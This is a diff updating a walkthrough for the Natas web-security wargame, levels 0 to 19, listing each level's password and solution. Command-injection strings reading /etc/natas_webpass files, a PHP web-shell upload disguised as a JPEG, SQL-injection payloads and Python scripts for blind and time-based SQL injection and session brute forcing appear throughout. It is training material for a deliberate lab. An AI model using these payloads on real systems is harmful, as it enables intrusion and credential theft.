@@ -1,129 +1,252 @@
 Level 0
-Goal:
-You can find the password for the next level on this page.
+
+Information Given:
+You can find the password for the next level on this page. 
 
 Solution:
-Right click -> View Page Source.
+Right-click -> View Page Source
+
+Password: gtVrDuiDfck831PqWsLEZy5gyDz1clto
+
 
 Level 1
-Goal:
-You can find the password for the next level on this page, but rightclicking has been blocked!
+
+Information Given:
+You can find the password for the next level on this page, but rightclicking has been blocked! 
 
 Solution:
-Right click -> View Page Source.
+Right-click -> View Page Source
+
+Password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
 
 Level 2
-Goal:
-There is nothing on this page
+
+Information Given:
+There is nothing on this page 
 
 Solution:
-Right click -> View Page Source.
-Click on the pixel.png
+Right-click -> View Page Source
+Notice: <img src="files/pixel.png">
 Browse to: http://natas2.natas.labs.overthewire.org/files/
-Click on 'users.txt'
+Click on "users.txt"
+
+Password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
 
 Level 3
-Goal:
+
+Information Given:
 There is nothing on this page
 
 Solution:
-Right click -> View Page Source.
+Right-click -> View Page Source
+Notice: <!-- No more information leaks!! Not even Google will find it this time... -->
 Browse to: http://natas3.natas.labs.overthewire.org/robots.txt
-Browse to: http://natas3.natas.labs.overthewire.org/s3cr3t/
-Click on 'users.txt'
+Browse to: http://natas3.natas.labs.overthewire.org//s3cr3t/
+Click on "users.txt"
+
+Password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
 
 Level 4
-Goal:
-Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 
+
+Information Given:
+Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
 
 Solution:
-Set iceweasel to connect to the Internet via manual proxy. (127.0.0.1:8080)
-Open Burp Suite and go to the Proxy section with Intercept On.
-Refresh the page.
-Edit Referer to: http://natas5.natas.labs.overthewire.org/
+# This hints at the key being to change the "Referer" parameter in the HTTP request.
+Start Burp Proxy with Intercept On
+Copy: http://natas5.natas.labs.overthewire.org/
+Refresh the page
+In Burp: Referer: http://natas5.natas.labs.overthewire.org/
 Forward
 
+Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 
+
+
 Level 5
-Goal:
+
+Information Given:
 Access disallowed. You are not logged in
 
 Solution:
-View Page Info.
-Click on Security.
-Install Cookies Manager+
-Refresh the page.
-Open Cookies Manager+ and search for the 'loggedin' cookie.
-Edit and set the Content value to 1.
-Refresh the page.
+# This hints at the key being cookie modification.
+Open Cookies Manager+
+Search: natas
+Edit the cookie from a value of 0 to a value of 1
+Refresh the page
+
+Password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
 
 Level 6
-Goal:
-Input secret: 
+
+Information Given:
+We get the source code and an Input bar.
 
 Solution:
-Open 'View sourcecode' in a new tab.
-Browse to: natas6.natas.labs.overthewire.org/includes/secret.inc
-Copy: FOEIUWGHFEEUHOFUOIU.
-Paste into Input box.
+'''
+Notice the following:
+
+<?
+
+include "includes/secret.inc";
+
+    if(array_key_exists("submit", $_POST)) {
+        if($secret == $_POST['secret']) {
+        print "Access granted. The password for natas7 is <censored>";
+    } else {
+        print "Wrong secret";
+    }
+    }
+?>
+
+'''
+Browse to: http://natas6.natas.labs.overthewire.org/includes/secret.inc
+Right-click -> View Page Source
+# The secret is: FOEIUWGHFEEUHOFUOIU
+Input secret: FOEIUWGHFEEUHOFUOIU -> Submit Query
+
+Password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 
+
 
 Level 7
-Goal: 
-Home About
 
-Solution: 
-Right click -> View Page Source.
-Click on 'Home' button.
+Information Given:
+We get a link to "Home" that displays: this is the front page
+We get a link to "About" that displays: this is the about page 
+
+Solution:
+Click on the "Home" link
+Right-click -> View Page Source
+# Notice: <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+# Notice the URL of the "Home" page includes: ?page=home
 Browse to: http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
 
-Level 8
-Goal: 
-Input secret: 
+Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
 
-Solution: 
-Open 'View sourcecode' in a new tab.
-Copy the encoded secret.
-Search Google for "reverse hexdump".
-Read: http://linuxcommand.org/man_pages/xxd1.html
+
+Level 8
+
+Information Given:
+We get the source code and an Input bar.
+
+Solution:
+'''
+Notice the following:
+
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+
+We simply have to decrypt the secret.
+'''
+
 echo 3d3d516343746d4d6d6c315669563362 | xxd -p -r | rev | base64 -d
-Copy/paste result into the 'Input secret' box.
+# The output is: oubWYf2kBq
+Input secret: oubWYf2kBq -> Submit Query
+
+Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
 
 Level 9
-Goal: 
-Find words containing:  
 
-Solution: 
-Open 'View sourcecode' in a new tab.
-; pwd
+Information Given:
+We get an input box "Find words containing", an Output, and the Source Code.
+
+Solution:
+'''
+Notice the following:
+
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+
+The code is vulnerable to command injection. 
+We can use passthru() to execute other commands by simply adding a semicolon.
+
+'''
+
+;pwd -> Search
 ; cat /etc/natas_webpass/natas10
 
+
+Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+
 Level 10
-Goal: 
-For security reasons, we now filter on certain characters
 
-Find words containing: 
+Information Given:
+We get an input box "Find words containing", an Output, and the Source Code.
+This time, "For security reasons, we now filter on certain characters".
 
-Solution: 
-Open "View sourcecode" in a new tab.
-In the search box: [a-z0-9] /etc/natas_webpass/natas11 #
+Solution:
+'''
+Notice the following:
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+
+There is filtering in place now. However, we can still bypass this.
+Instead of a semicolon, we can just use ellipsis (...)
+
+
+'''
+Find words containing: ... cat /etc/natas_webpass/natas11 -> Search
+
+Password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
 
 Level 11
-Goal: 
-Cookies are protected with XOR encryption
 
-Background color: 
+Information Given:
+"Cookies are protected with XOR encryption".
+We get an input box titled "Background color" and a button to set the color.
+We also get the source code.
 
-Solution: 
-Open "View sourcecode" in a new tab.
-Search Google for "xor encryption".
-Read: https://en.wikipedia.org/wiki/XOR_cipher
-Copy the plain-text in $defaultdata: 
-array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
-Search for 'data' in Cookie Manager+.
-Copy the cipher text in Content: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaA
+Solution:
+'''
+Notice the following:
 
-Copy and modify the xor_encrypt php code as:
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
 
-cat > natas11a.php
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+
+We can repurpose the source code to get the key and generate the correct cookie.
+We will use $defaultdata as the plaintext and the cookie value as the ciphertext.
+
+'''
+
+Open Cookies Manager+ -> Search: natas -> Copy the cookie value
+gedit break_natas11.php
+
 <?php
 
 $p_text = json_encode(array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
@@ -145,604 +268,691 @@ print xor_encrypt($p_text, $c_text);
 
 ?>
 
-php natas11a.php
-Copy "qw8J".
+php break_natas11.php
+# The output is: qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+# The key is: qw8J
 
-cat > natas11b.php
-<?php
+Comment out the "print" and add the following to the code above:
 
-$p_text = array("showpassword"=>"yes", "bgcolor"=>"#ff0000");
-$key = "qw8J";
+// The key was added after running the code above by itself.
+$the_key = "qw8J";
+$plaintext = array("showpassword"=>"yes", "bgcolor"=>"#ff0000");
 
-function xor_encrypt($in, $k) {
-    $key = $k;
-    $text = $in;
-    $outText = '';
+print base64_encode(xor_encrypt(json_encode($plaintext), $the_key));
 
-    for($i=0;$i<strlen($text);$i++) {
-        $outText .= $text[$i] ^ $key[$i % strlen($key)];
-    }
+# For the full code, see: break_natas11.php
 
-    return $outText;
-}
+php break_natas11.php
+# The output is: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sQUcIelMK
+Open Cookies Manager+ -> Replace the cookie value with the value above
+Refresh the page
 
-print base64_encode(xor_encrypt(json_encode($p_text), $key));
+Password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
 
-?>
-
-php natas11b.php
-In CookiesManager+ edit the Content to: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sQUcIelMK
-
-Refresh page.
 
 Level 12
-Goal: 
-Choose a JPEG to upload (max 1KB):
 
-Solution: 
-Open "View sourcecode" in a new tab.
-Search Google for "php execute external program".
-Read: http://php.net/manual/en/function.exec.php
-vi 12owned.php
+Information Given:
+"Choose a JPEG to upload (max 1KB)". We get file uploading options and the source code.
+
+Solution:
+# The first question that comes to mind is whether we can upload stuff other than JPEGs
+vi break_natas12.php
 <?php echo exec("cat /etc/natas_webpass/natas13"); ?>
 
-Inspect the POST form and change the value from 'jpg' to 'php'.
-Upload 12owned.php
-Open the link.
+Right-click on "Browse..." -> Inspect Element -> Scroll up to the filename
+Change the filename value extension from ".jpg" to ".php"
+Upload File
+Click on the file link
+
+Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
 
 Level 13
-Goal: 
- For security reasons, we now only accept image files!
 
-Choose a JPEG to upload (max 1KB):
+Information Given:
+"For security reasons, we now only accept image files!". We can upload files and we also get the source code.
 
-Solution: 
-Open "View sourcecode" in a new tab.
-Search Google for "exif_imagetype".
-Read: http://php.net/manual/en/function.exif-imagetype.php
-Search Google for "jpeg magic number".
-Read: http://www.astro.keele.ac.uk/oldusers/rno/Computing/File_magic.html
+Solution:
+# The first thing that comes to mind is disguising a script as an image file
+# We can write the JPEG magic number before our code to trick the program
+# See magicNum_trick.py for how I do this
+vi pwn_natas13.php
+<?php echo exec("cat /etc/natas_webpass/natas14"); ?>
 
-vi php-jpg-trick.py
-# Tricks programs into believing the PHP code is a JPEG.
+python magicNum_trick.py 1 break_natas13.php pwn_natas13.php
+Right-click on "Browse..." -> Inspect Element -> Scroll up to the filename
+Change the filename value extension from ".jpg" to ".php"
+Upload File
+Click on the file link
 
-trick = open('13owned.php', 'w')
+Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
 
-trick.write('\xFF\xD8\xFF\xE0' + '<?php echo exec("cat /etc/natas_webpass/natas14"); ?>')
-
-trick.close
-
-python php-jpg-trick.py
-
-Inspect the POST form and change the value from 'jpg' to 'php'.
-Upload 13owned.php
-Open the link.
 
 Level 14
-Goal:
-Username: 
-Password: 
+
+Information Given:
+We get a username field, a password field, and the source code.
 
 Solution:
-Open "View sourcecode" in a new tab.
-In the username field enter: caca" or "1"="1
-In the password field enter: caca" or "1"="1
-Login
+# From the source code we can see that this is very likely a SQL injection
+Username: admin" or "1"="1
+Password: admin" or "1"="1
+
+Password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
 
 Level 15
-Goal:
-Username:
+
+Information Given:
+We get a username field for which we can "check existence" by pressing a button, as well as the source code.
 
 Solution:
+'''
+Looking at the source code, this is another SQL injection related challenge
+We know we're on the money when we get the message "This user exists."
+However, this isn't enough, since we very likely also need to get the password right
+in order to get the flag 
+We are going to have to write a script to bruteforce the process
+'''
+vi break_natas15.py
+
+from string import ascii_lowercase, ascii_uppercase
+import requests
 
 
-Open "View sourcecode" in a new tab.
-Read: https://www.owasp.org/index.php/Blind_SQL_Injection
-Read: http://www.w3schools.com/sql/sql_like.asp
-Read: http://dev.mysql.com/doc/refman/5.5/en/cast-functions.html#operator_binary
-Read: http://www.w3schools.com/sql/sql_wildcards.asp
+def get_request(target):
+	req = requests.get(target)
+	
+	if req.status_code != requests.codes.ok:
+		raise ValueError("[!] Unable to connect to target.")
+	else:
+		print "[*] Successfully connected to target."
 
-cat > 15owned.py
-# Library for POST requests and library for Ascii characters.
-import string, requests
 
-# All possible characters
-all_chars = '0123456789' + string.ascii_lowercase + string.ascii_uppercase
+def url_sqli(target):
+	# All possible characters
+	all_chars = "0123456789" + ascii_lowercase + ascii_uppercase
 
-# Parsed characters, the characters that exist in the password
-parsed_chars = ''
+	# Parsed characters, the characters that exist in the password
+	parsed_chars = ""
 
-# Working password
-password = ''
+	# Working password
+	password = ""
 
-# The target URL
-target = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/'
+	# String that verifies we're on the money
+	exists = "This user exists."
 
-# String that says whether we're good
-exists = 'This user exists.'
+	for c in all_chars:
+		# SQL injection #1 - Using BINARY allows for a case-sensitive comparison
+		req = requests.get(target + '?username=natas16" AND password LIKE BINARY "%' + c + '%" "')
 
-# Verifying we can connect
-req = requests.get(target)
-
-if req.status_code != requests.codes.ok:
-	raise ValueError('Poof! Unable to connect to target :(')
-else:
-	print 'Connected to target. Starting character parsing...'
-
-# Verify which characters are part of the working password
-for c in all_chars:
-	# SQL injection #1
-	req = requests.get(target+'?username=natas16" AND password LIKE BINARY "%'+c+'%" "')
-	# Verify if password uses character
-	if req.content.find(exists) != -1:
-		parsed_chars += c
-		print 'Chars in pass: ' + parsed_chars
-
-print 'Characters successfully parsed. Starting to brute force...'
-
-# With the assumption passwords are 32 characters long
-for i in range(32):
-	for c in parsed_chars:
-		# SQL injection #2
-		req = requests.get(target+'?username=natas16" AND password LIKE BINARY "' + password + c + '%" "')
-		# Figuring out characters at the correct position in the pass
+		# Verify if password uses current character
 		if req.content.find(exists) != -1:
-			password += c
-			print 'Password: ' + password + '*' * int(32 - len(password))
-			break
+			parsed_chars += c
+			print "Chars in password: " + parsed_chars
 
-print 'Successfully brute forced password.'
+	print "[*] Characters successfully parsed. \n[*] Starting to brute-force..."
 
-python 15owned.py
+	# With the assumption that passwords are 32-characters long
+	for i in range(32):
+		for c in parsed_chars:
+			# SQL injection #2
+			req = requests.get(target + '?username=natas16" AND password LIKE BINARY "' + password + c + '%" "')
+		
+			# Figuring out the correct location of characters in the password
+			if req.content.find(exists) != -1:
+				password += c
+				print "[*] Password: " + password + ('*' * int(32 - len(password)))
+				break
+
+	print "[*] Successfully brute-forced password."
+
+
+def main():
+	target = raw_input("Enter the target URL (E.g., http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/)\n: ")
+
+	get_request(target)
+	url_sqli(target)
+
+main()
+
+
+python break_natas15.py
+
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
 
 Level 16
-Goal:
-For security reasons, we now filter even more on certain characters
 
-Find words containing:
+Information Given:
+"For security reasons, we now filter even more on certain characters"
+We get an input field where we can "Find words containing: "
+We also get the source code.
 
 Solution:
 Open "View sourcecode" in a new tab.
-Search Google for "bash command substitution".
-Read: https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html
-$(foo)
+'''
+Notice the following:
 
-cat > 16owned.py
-# Library for Ascii characters and POST requests
-import string, requests
+$key = "";
 
-# All possible characters
-all_chars = '0123456789' + string.ascii_lowercase + string.ascii_uppercase
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
 
-# Parsed characters, the characers that exist in the working password
-parsed_chars = ''
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
 
-# Working Password
-password = ''
 
-# The target URL
-target = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/'
+This is very similar to level 9, where we performed command injection
+Although we can't use the semi-colon to inject commands, 
+we may still be able to perform command substitution
+'''
 
-# String that says whether we're good
-exists = 'Output:\n<pre>\n</pre>'
+Find words containing: $(foo) -> Search
+# Our query was effective, so we can use command substitution
+Find words containing: $(cat /etc/natas_webpass/natas17) -> Search
 
-# Verifying we can connect
-req = requests.get(target)
-if req.status_code != requests.codes.ok:
-        raise ValueError('Poof! Unable to connect to target :(')
-else:
-        print 'Connected to target. Starting character parsing...'
+'''
+That didn't work. However, it still serves to know that command substitution is in play
+We are going to have to brute-force our way, 
+while using a known word so that we get some output
+'''
 
-# Verify which characters are part of the working password
-for c in all_chars:
-        # Command injection #1
-        req = requests.get(target+'?needle=$(grep '+c+' /etc/natas_webpass/natas17)bypassed')
-        # Verify if password uses character
-        if req.content.find(exists) != -1:
-                parsed_chars += c
-                print 'Chars in pass: ' + parsed_chars
+vi break_natas16.py
 
-print 'Characters successfully parsed. Starting to brute force...'
+from string import ascii_lowercase, ascii_uppercase
+import requests
 
-# With the assumption passwords are 32 characters long
-for i in range(32):
-        for c in parsed_chars:
-                # Command injection #2
-                req = requests.get(target+'?needle=$(grep ^'+password+c+' /etc/natas_webpass/natas17)bypassed')
-                # Figuring out characters at the correct position in the pass
-                if req.content.find(exists) != -1:
-                        password += c
-                        print 'Password: ' + password + '*' * int(32 - len(password))
-                        break
 
-print 'Successfully brute-forced password.'
+def get_request(target):
+	req = requests.get(target)
+	
+	if req.status_code != requests.codes.ok:
+		raise ValueError("[!] Unable to connect to target.")
+	else:
+		print "[*] Successfully connected to target."
 
-python 16owned.py
+
+def url_command_brute(target):
+	# All possible characters
+	all_chars = "0123456789" + ascii_lowercase + ascii_uppercase
+
+	# Parsed characters, the characters that exist in the password
+	parsed_chars = ""
+
+	# Working password
+	password = ""
+
+	# String that verifies we're on the money
+	exists = "Output:\n<pre>\n</pre>"
+
+	for c in all_chars:
+		# Command injection #1 - using the word "bypassed" as the known word
+		req = requests.get(target + '?needle=$(grep ' + c + ' /etc/natas_webpass/natas17)bypassed')
+
+		# Verify if password uses current character
+		if req.content.find(exists) != -1:
+			parsed_chars += c
+			print "Chars in password: " + parsed_chars
+
+	print "[*] Characters successfully parsed. \n[*] Starting to brute-force..."
+
+	# With the assumption that passwords are 32-characters long
+	for i in range(32):
+		for c in parsed_chars:
+			# Command injection #2
+			# The ^ is used to grab only what matches what follows after it
+			req = requests.get(target+'?needle=$(grep ^' + password + c + ' /etc/natas_webpass/natas17)bypassed')
+		
+			# Figuring out the correct location of characters in the password
+			if req.content.find(exists) != -1:
+				password += c
+				print "[*] Password: " + password + ('*' * int(32 - len(password)))
+				break
+
+	print "[*] Successfully brute-forced password."
+
+
+def main():
+	target = raw_input("Enter the target URL (E.g., http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/)\n: ")
+
+	get_request(target)
+	url_command_brute(target)
+
+main()
+
+
+python break_natas16.py
+
+Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
 
 Level 17
-Goal:
-Username: 
+
+Information Given:
+We get an input field where we can check for the existence of a username.
+We also get the source code.
 
 Solution:
 Open "View sourcecode" in a new tab.
-Search Google for "time-based blind sql injection attacks".
-Read: http://www.sqlinjection.net/time-based/
+'''
+This is yet another SQL injection challenge
 
-cat > 17owned.py
-# Library for POST requests and library for Ascii characters.
-import string, requests
+After attempting to retrieve information several times and getting nothing, this leads us to believe that a time-based blind SQL injection might be our way in
 
-# All possible characters
-all_chars = '0123456789' + string.ascii_lowercase + string.ascii_uppercase
+This type of injection can be useful in this case because depending on the time it takes for the server to respond to a query, we can deduct whether we are on the right path or not, whether our query is valid or not
+'''
 
-# Parsed characters, the characters that exist in the password
-parsed_chars = ''
+vi break_natas17.py
 
-# Working password
-password = ''
+from string import ascii_lowercase, ascii_uppercase
+import requests
 
-# The target URL
-target = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'
 
-# String that says whether we're good
-exists = 'This user exists.'
+def get_request(target):
+	req = requests.get(target)
+	
+	if req.status_code != requests.codes.ok:
+		raise ValueError("[!] Unable to connect to target.")
+	else:
+		print "[*] Successfully connected to target."
 
-# Verifying we can connect
-req = requests.get(target)
 
-if req.status_code != requests.codes.ok:
-	raise ValueError('Poof! Unable to connect to target :(')
-else:
-	print 'Connected to target. Starting character parsing...'
+def time_based_url_sqli(target):
+	# All possible characters
+	all_chars = "0123456789" + ascii_lowercase + ascii_uppercase
 
-# Verify which characters are part of the working password
-for c in all_chars:
-        # SQL time-based injection #1
-        try:
-                r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "%'+c+'%", sleep(5), null) %23', timeout=1)
-        except requests.exceptions.Timeout:
-                # If we get a timeout, the character exists
-                parsed_chars += c
-                print 'Used chars: ' + parsed_chars
+	# Parsed characters, the characters that exist in the password
+	parsed_chars = ""
 
-print 'Characters successfully parsed. Starting to brute force...'
+	# Working password
+	password = ""
 
-# With the assumption password is 32 characters long
-for i in range(32):
-        for c in parsed_chars:
-                # SQL time-based injection #2
-                try:
-                        r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "' + password + c + '%", sleep(5), null) %23', timeout=1)
-                # Figuring out characters at the correct position in the password
-                except requests.exceptions.Timeout:
-                        password += c
-                        print 'Password: ' + password + '*' * int(32 - len(password))
-                        break
+	# String that verifies we're on the money
+	exists = "This user exists."
 
-print 'Successfully brute-forced password.'
+	for c in all_chars:
+		try:
+			# SQL time-based injection #1 - Sleeps when true, is passed null when false
+			req = requests.get(target + '?username=natas18" AND IF(password LIKE BINARY "%' + c + '%", sleep(5), null) %23', timeout=1)
 
-python 17owned.py
+		# If we get a timeout, the password uses current character
+		except requests.exceptions.Timeout:
+			parsed_chars += c
+			print "[*] Chars in password: " + parsed_chars
+
+	print "[*] Characters successfully parsed. \n[*] Starting to brute-force..."
+
+	# With the assumption that passwords are 32-characters long
+	for i in range(32):
+		for c in parsed_chars:
+			try:
+				# SQL time-based injection #2
+				req = requests.get(target + '?username=natas18" AND IF(password LIKE BINARY "' + password + c + '%", sleep(5), null) %23', timeout=1)
+		
+			# Figuring out the correct location of characters in the password
+			except requests.exceptions.Timeout:
+				password += c
+				print "[*] Password: " + password + ('*' * int(32 - len(password)))
+				break
+
+	print "[*] Successfully brute-forced password."
+
+
+def main():
+	target = raw_input("Enter the target URL (E.g., http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/)\n: ")
+
+	get_request(target)
+	time_based_url_sqli(target)
+
+main()
+
+
+python break_natas17.py
+
+Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+
 
 Level 18
-Goal:
- Please login with your admin account to retrieve credentials for natas19.
-Username:
-Password:
+
+Information Given:
+"Please login with your admin account to retrieve credentials for natas19."
+We get username and password input boxes, along with the source code.
 
 Solution:
-Open "View sourcecode" in a new tab.
-Search Google for "php sessions".
-Read: http://php.net/manual/en/session.examples.basic.php
-Search Google for "bruteforce php session id".
-Click on: https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_Brute_Force_Session_Identifier
-Read: http://projects.webappsec.org/w/page/13246915/Brute%20Force
+'''
+Brute-forcing is the key, yet again.
 
-cat > 18owned.py
-# Library for POST requests.
+Notice the following:
+
+$maxid = 640; // 640 should be enough for everyone
+
+if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"]))
+
+if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>"; 
+
+
+From this information we know the following:
+1) There is a 640-try limit
+2) We have to brute-force the cookie titled PHPSESSID
+3) We get "You are an admin." if our guess is right.
+
+'''
+
+vi break_natas18.py
+
 import requests
 
-# Target URL
-target = 'http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/'
-# Confirmation we are in.
-accept_me = "You are an admin."
+def get_request(target):
+	req = requests.get(target)
+	
+	if req.status_code != requests.codes.ok:
+		raise ValueError("[!] Unable to connect to target.")
+	else:
+		print "[*] Successfully connected to target."
 
-# Verifying we can connect.
-req = requests.get(target)
-if req.status_code != requests.codes.ok:
-        raise ValueError('Poof! Unable to connect to target :(')
-else:
-        print 'Connected to target. Starting session brute force...'
 
-# Iterate each session and check if there's one with admin access
-for i in range(1,641):
-        if i % 10 == 0:
-                print 'Checked '+str(i)+' sessions...'
-        cookies = dict(PHPSESSID=str(i))
-        req = requests.get(target, cookies=cookies)
-        # Did we find the right session?
-        if req.content.find(accept_me) != -1:
-                print 'Got it! Session='+str(i)
-                print req.content
-                break
-print 'Successfully brute-forced session.'
+def cookie_bruteforce(target):
+	# String we get if we're admin
+	exists = "You are an admin."
 
-python 18owned.py
+	# Iterate each session and check if there's one with admin access
+	for i in range(641):
+		if i % 10 == 0:
+			print "[*] Checked", str(i), "sessions."
+
+		cookies = dict(PHPSESSID=str(i))
+		req = requests.get(target, cookies=cookies)
+
+		# If the page content's has the admin message
+		if req.content.find(exists) != -1:
+				print "[*] Admin session found: ", str(i)
+				print req.content
+				break
+
+	print "[*] Successfully brute-forced session."
+
+
+def main():
+	target = raw_input("Enter the target URL (E.g., http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/)\n: ")
+
+	get_request(target)
+	cookie_bruteforce(target)
+
+main()
+
+
+python break_natas18.py
+
+
+Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+
 
 Level 19
-Goal:
- This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
 
-Please login with your admin account to retrieve credentials for natas20.
-Username:
-Password:
+Information Given:
+" This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+
+Please login with your admin account to retrieve credentials for natas20. "
+
+This time we get no source code. Just the above, plus two input boxes for username and password.
+
 
 Solution:
-Open "View sourcecode" in a new tab.
-Log in with no credentials, open Cookies Manager+, look at the PHPSESSID and delete it. Do this multiple times. Take note of the changes.
-Note that the last two characters are always the same. 0x2D, which is the hex value for '-' in ASCII.
-Search Google for "hex values chart".
-Read: http://www.asciitable.com/
-Note that the rest are numbers. So what we get are three numbers followed by '-', meaning we have a hex-encoded string.
-Enter the letter 'a' in the username field and inspect the cookie. Delete and do the same for 'b' and 'c'. 
-Recall the 'isValidAdminLogin' function from the previous challenge. It is most likely activated in this level, hence the username is most likely 'admin'.
+Log in with username: a
+Open Cookies Manager+ and write down the value of PHPSESSID, in my case: 36382d61
+Delete the cookie
+Log in with username: b
+Write down the value of PHPHSESSID: 3438362d62
+Delete and repeat with c
+Write down the value of PHPSESSID: 3537312d63
 
-cat > 19owned.py
-# Library for POST requests.
+'''
+The last character is clearly hex.
+61 = a
+62 = b
+63 = c
+
+I use a script I wrote that converts between different formats.
+If you want to use it, you can find it here:
+Be sure to follow me on Github if you use it! 
+'''
+
+./format_convert.py 36382d61 -2ascii
+# The result is: 68-a
+./format_convert.py 3438362d62 -2ascii
+# The result is: 486-b
+./format_convert.py 3537312d63 -2ascii
+# The result is: 571-c
+
+'''
+From this we know that the encryption is: <password>-<username>
+
+Recall from the previous challenge:
+
+function isValidAdminLogin() { /* {{{ */
+    if($_REQUEST["username"] == "admin") {
+    /* This method of authentication appears to be unsafe and has been disabled for now. */
+        //return 1;
+    }
+
+    return 0;
+}
+
+If this function is active this time, then it means that the username will be "admin".
+
+We will reuse the code from last challenge, except we will add "-admin" to the guesses and hex encode the cookie.
+'''
+
+vi break_natas19.py
+
 import requests
 
-# Target URL
-target = 'http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/'
-# Confirmation we are in.
-accept_me = "You are an admin."
+def get_request(target):
+	req = requests.get(target)
+	
+	if req.status_code != requests.codes.ok:
+		raise ValueError("[!] Unable to connect to target.")
+	else:
+		print "[*] Successfully connected to target."
 
-# Verifying we can connect.
-req = requests.get(target)
-if req.status_code != requests.codes.ok:
-        raise ValueError('Poof! Unable to connect to target :(')
-else:
-        print 'Connected to target. Starting session brute force...'
 
-# Iterate each session and check if there's one with admin access.
-for i in range(1,641):
-        if i % 10 == 0:
-                print 'Checked '+str(i)+' sessions...'
-	# Try our luck with the discovered '-admin' ending.
-        cookies = dict(PHPSESSID=(str(i)+'-admin').encode('hex'))
-        req = requests.get(target, cookies=cookies)
-        # Did we find the right session?
-        if req.content.find(accept_me) != -1:
-                print 'Got it! Session='+str(i)
-                print req.content
-                break
-print 'Successfully brute-forced session.'
+def cookie_bruteforce(target):
+	# String we get if we're admin
+	exists = "You are an admin."
 
-python 19owned.py
+	# Iterate each session and check if there's one with admin access
+	for i in range(641):
+		if i % 10 == 0:
+			print "[*] Checked", str(i), "sessions."
+
+		cookies = dict(PHPSESSID=(str(i)+"-admin").encode("hex"))
+		req = requests.get(target, cookies=cookies)
+
+		# If the page content's has the admin message
+		if req.content.find(exists) != -1:
+				print "[*] Admin session found: ", str(i)
+				print req.content
+				break
+
+	print "[*] Successfully brute-forced session."
+
+
+def main():
+	target = raw_input("Enter the target URL (E.g., http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/)\n: ")
+
+	get_request(target)
+	cookie_bruteforce(target)
+
+main()
+
+
+python break_natas19.py
+
+
